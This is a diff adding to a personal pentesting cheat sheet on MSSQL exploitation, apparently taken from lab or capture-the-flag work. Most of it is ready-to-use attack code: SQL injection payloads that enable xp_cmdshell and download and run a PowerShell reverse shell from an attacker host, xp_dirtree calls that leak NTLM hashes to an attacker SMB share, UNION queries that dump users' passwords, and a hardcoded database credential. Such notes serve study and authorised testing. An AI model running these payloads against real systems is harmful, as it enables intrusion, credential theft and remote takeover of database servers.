@@ -41,6 +41,14 @@ proxychains sqsh -S 10.10.126.148 -U example.com\\sql_service -P password123 -D 
 
 ##### Expliotation
 
+```bash
+xp_cmdshell whoami
+enable_xp_cmdshell
+
+# set up smb share locally to grab hash
+xp_dirtree \\10.10.14.8\fake\share
+```
+
 ````
 EXEC SP_CONFIGURE 'show advanced options', 1
 reconfigure
@@ -62,6 +70,80 @@ Revshell Command that worked:
 admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
 ```
 
+#### Possible Queries
+
+Test for xp_cmdshell first. A great guide is pentestmonkey's mssql cheatsheet.
+
+Test for stacked queries, which is unique to MSSQL. Open up share on machine, or nc on 445.
+
+```bash
+q=500'; exec xp_dirtree '\\10.10.14.8\share\file';-- - # Used 500' bc union returned on this
+```
+
+Test for xp_cmdshell.
+
+```bash
+q=500'; exec xp_cmdshell 'ping 10.10.14.8';-- - # Run sudo tcpdump -i tun0 icmp
+q=500'; exec sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; exec xp_cmdshell 'ping 10.10.14.8';-- -
+q=500' UNION SELECT 1,2,3,4,5,6; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.8:8000/rev.ps1") | powershell -noprofile';--+
+q=500' UNION SELECT 1,2,3,4,5,6; exec sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.8:8000/rev.ps1") | powershell -noprofile';--+
+```
+
+For this, test for SQLi by doing something like '500%-- -' and checking response. Pick a field in response that only is returned for a valid search, and see when it's not returned.
+
+```bash
+select * from movies where name like '%500%';
+q=500%'-- -
+q=%500'-- -
+q=500%' union select 1,2,3-- - # Until that field is returned
+q=500' union select 1,2,3,4,5,6-- - # Same, RETURNED
+q=500' union select 1,7337,9001,4,5,6-- -
+q=500' union select 1,7337,9001,4,5,6-- -
+q=500' union select 1,@@version,9001,4,5,6-- -
+q=500' union select 1,user,9001,4,5,6-- -
+q=500' union select 1,db_name(0),9001,4,5,6-- - # Run through integers to enum dbs
+q=500' union select 1,name,3,4,5,6 from streamio..sysobjects where xtype='u'-- - # db is streamio
+q=500' union select 1,CONCAT(name,':',id),3,4,5,6 from streamio..sysobjects where xtype='u'-- -
+q=500' union select 1,string_agg(CONCAT(name,':',id),'|'),3,4,5,6 from streamio..sysobjects where xtype='u'-- - # Putting on a single row
+q=500' union select 1,string_agg(CONCAT(name,':',id),'|'),3,4,5,6 from streamio..syscolumns where id=901578250-- - # 901.. is the users table that was returned from id
+q=500' union select 1,string_agg(name,'|'),3,4,5,6 from streamio..syscolumns where id=901578250-- - # Don't need the id anymore, the last two have returned the columns, such as password, username, but not the data itself
+q=500' union select 1,string_agg(concat(username,':',password),'|'),3,4,5,6 from users-- -
+q=500' union select 1,string_agg(concat(username,':',password),'|'),3,4,5,6 from streamio..users-- -
+```
+
+```bash
+select * from movies where CONTAINS (name, '*500*');
+```
+
+#### Enumeration
+
+```bash
+SELECT name FROM sys.databases;
+```
 ##### Notes
 
 If you're chiseling to look at mssql through the website on your localhost, go to phpmyadmin directory on the website
+
+#### On Windows
+
+If it has MSSQL installed. If not, you could always use Chisel.
+
+```bash
+sqlcmd -U db_admin -P 'B1@hx31234567890' -Q "USE STREAMIO_BACKUP; select username,password from users;"
+```
+
+```bash
+sqlcmd -?
+sqlcmd -Q "select * from sys.databases"
+sqlcmd -Q "select name from sys.databases"
+sqlcmd -Q "use ADSync; select * from ADSync..sysobjects"
+sqlcmd -Q "use ADSync; exec xp_dirtree '\\10.10.14.8\share\file'"
+sqlcmd -Q "use ADSync; select name from PK_mms_management_agent"
+```
+
+```bash
+. .\PowerUpSQL.ps1
+Invoke-SQLAudit -Verbose
+```
+
+If AD Azure, check out "https://blog.xpnsec.com/azuread-connect-for-redteam/".
